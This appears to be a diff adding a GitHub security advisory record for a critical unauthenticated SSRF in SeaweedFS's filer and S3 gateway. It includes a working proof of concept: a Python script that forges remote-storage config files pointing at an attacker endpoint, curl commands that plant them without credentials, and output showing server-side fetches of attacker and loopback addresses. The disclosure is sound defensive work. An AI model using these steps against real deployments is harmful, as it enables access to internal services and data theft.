@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-cw34-7fm4-63g6",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "### Summary\r\nTwo callers of `remote_storage.GetRemoteStorage` - `streamFromRemote` (filer, port 8888) and `openRemoteStream` (S3 gateway, port 8333) - build a remote S3 client from an attacker-supplied endpoint with none of the validation added for CVE-2026-73080, then stream the fetched bytes back to the requester. On a stock deployment the `RemoteConf` holding that endpoint is writable without a credential, giving an unauthenticated attacker **SSRF with full response read-back** - the primitive patched for the volume server only.\r\n\r\n### Details\r\nBoth sinks call the bare builder:\r\n\r\n```go\r\n// weed/server/filer_server_handlers_read.go:289  (streamFromRemote)\r\nstorageConf, remoteLocation, err := fs.resolveMountedRemote(ctx, dir, name)\r\nclient, err := remote_storage.GetRemoteStorage(storageConf) // no validation, no guarded dialer\r\n```\r\n\r\n`openRemoteStream` (`weed/s3api/s3api_object_handlers.go:3336`) is identical. Compare the volume server's caller of the same builder, patched for CVE-2026-73080:\r\n\r\n```go\r\n// weed/server/volume_grpc_remote.go:376-388\r\nif endpoint, makeClient, ok := guardedRemoteClient(remoteConf); ok && !vs.AllowUntrustedRemoteEndpoints {\r\n\tif validateErr := validateRemoteEndpoint(ctx, endpoint); validateErr != nil { ... }\r\n\tclient, getClientErr = makeClient(newGuardedHTTPClient(endpoint)) // rebinding-safe\r\n}\r\n```\r\n\r\n- Neither `validateRemoteEndpoint` nor `newGuardedHTTPClient` is reachable from either caller above.\r\n- `storageConf` is resolved from `/etc/remote/<name>.conf` and `/etc/remote/mount.mapping` - ordinary filer entries.\r\n- The write handler treats `/etc` as a storage hint only (`filer_server_handlers_write.go:131`, `so.SaveInside = true`), with no path ACL; the filer's gRPC `CreateEntry` carries no authentication at all.\r\n- Precondition is the shipped default (no `-whiteList`, no `security.toml`) plus network reach to port 8888 alone - no other port, no credential, no client tooling.\r\n\r\n### PoC\r\nStock `weed server -master -volume -filer -s3`, no `-whiteList`, no `security.toml`. Every request below goes to the **filer's HTTP port (8888) only** - no credential, no client binary, no gRPC. `ATTACKER` is a minimal HTTP server answering `ListObjectsV2` with one key, `secret.txt`, and serving a fixed marker string; it stands in for any endpoint the attacker names, and neither the key nor the marker exists on the filer.\r\n\r\nThe two config entries are a `remote_pb.RemoteConf` and a `remote_pb.RemoteStorageMapping`, written as ordinary files. Build them with stdlib Python - no `weed` tooling of any kind (`s3_region` must be set, or the SDK aborts with `MissingRegion` before it ever dials):\r\n\r\n```python\r\nENDPOINT = \"http://ATTACKER:8000\"        # the endpoint the server will be made to dial\r\nMOUNT, NAME, BUCKET = \"/buckets/poc\", \"poc\", \"pocbucket\"\r\n\r\ndef uv(n):                               # protobuf varint\r\n    o = b\"\"\r\n    while True:\r\n        b = n & 0x7F; n >>= 7; o += bytes([b | (0x80 if n else 0)])\r\n        if not n: return o\r\ndef s(f, x): x = x.encode(); return bytes([f << 3 | 2]) + uv(len(x)) + x\r\ndef i(f, x): return bytes([f << 3]) + uv(x)\r\ndef m(f, x): return bytes([f << 3 | 2]) + uv(len(x)) + x\r\n\r\n# RemoteConf: type=1 name=2 access_key=4 secret_key=5 region=6 endpoint=7 force_path_style=9\r\nopen(\"poc.conf\", \"wb\").write(\r\n    s(1,\"s3\") + s(2,NAME) + s(4,\"AKIAPOC\") + s(5,\"SECRETPOC\")\r\n    + s(6,\"us-east-1\") + s(7,ENDPOINT) + i(9,1))\r\n# RemoteStorageMapping.mappings[MOUNT] = RemoteStorageLocation{name=1 bucket=2 path=3 ttl=4}\r\nloc = s(1,NAME) + s(2,BUCKET) + s(3,\"/\") + i(4,5)\r\nopen(\"mount.mapping\", \"wb\").write(m(1, s(1,MOUNT) + m(2,loc)))\r\n```\r\n\r\nPlant them, and create the mount directory, with no credential:\r\n\r\n```\r\n$ curl -X POST -F file=@poc.conf       http://TARGET:8888/etc/remote/poc.conf\r\n{\"name\":\"poc.conf\"}\r\n$ curl -X POST -F file=@/dev/null      http://TARGET:8888/buckets/poc/.keep\r\n$ curl -X POST -F file=@mount.mapping  http://TARGET:8888/etc/remote/mount.mapping\r\n{\"name\":\"mount.mapping\"}\r\n```\r\n\r\nAn anonymous listing now makes the **filer** perform the remote LIST and materialise the attacker endpoint's response as filer metadata:\r\n\r\n```\r\n$ curl -H 'Accept: application/json' http://TARGET:8888/buckets/poc/\r\n{\"Path\":\"/buckets/poc\",\"Entries\":[ ...,\r\n {\"FullPath\":\"/buckets/poc/secret.txt\",\"FileSize\":28,\r\n  \"Remote\":{\"storage_name\":\"poc\",\"remote_e_tag\":\"\\\"aaaa…\\\"\",\"remote_size\":28}}]}\r\n```\r\n\r\nAn anonymous read returns the bytes the server fetched, verbatim:\r\n\r\n```\r\n$ curl http://TARGET:8888/buckets/poc/secret.txt\r\nSSRF-READBACK-PROOF-6c1f2a9d\r\n```\r\n\r\n**The dial is the server's.** `ATTACKER` is reachable only from the server's own network, never from the host issuing the curls, and its request log shows exactly the two fetches the filer made on their behalf:\r\n\r\n```\r\nGET /pocbucket?delimiter=%2F&list-type=2&prefix=\r\nGET /pocbucket/secret.txt\r\n```\r\n\r\n**No destination filtering.** Repeating the same three POSTs with `s3_endpoint=http://127.0.0.1:9333`, the server dialed loopback and returned that internal service's own 404 - not the `remote endpoint %q resolves to loopback address` refusal the patched volume-server path raises for the same input:\r\n\r\n```\r\nW filer_lazy_remote_listing.go:164 maybeLazyListFromRemote: list /buckets/poc:\r\n  list directory name:\"poc\" bucket:\"pocbucket\" path:\"/\": NotFound: Not Found\r\n```\r\n\r\n### Impact\r\nAn anonymous remote attacker on a default-configured filer or S3 gateway makes the server issue requests to any destination they choose and reads the response body. Cloud metadata (`169.254.169.254`) and RFC1918 hosts are reachable by the same mechanism - the destinations the CVE-2026-73080 fix enumerates and refuses on the volume-server path - but were not separately exercised, and that reach is stated as inference, not result.\r\n\r\nFix: route these callers through the same guarded builder the volume server now uses, so the deny-list and rebinding-safe dialer apply wherever a `RemoteConf` endpoint is dialed.",
+    "ghsa_id": "GHSA-cw34-7fm4-63g6",
+    "html_url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-cw34-7fm4-63g6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-cw34-7fm4-63g6"
+      }
+    ],
+    "published_at": "2026-11-09T19:44:08Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Unauthenticated SSRF via unguarded remote-storage callers in filer and S3 gateway",
+    "updated_at": "2026-11-09T19:44:08Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/seaweedfs/seaweedfs"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 4.44"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "seaweedfs/seaweedfs"
+}
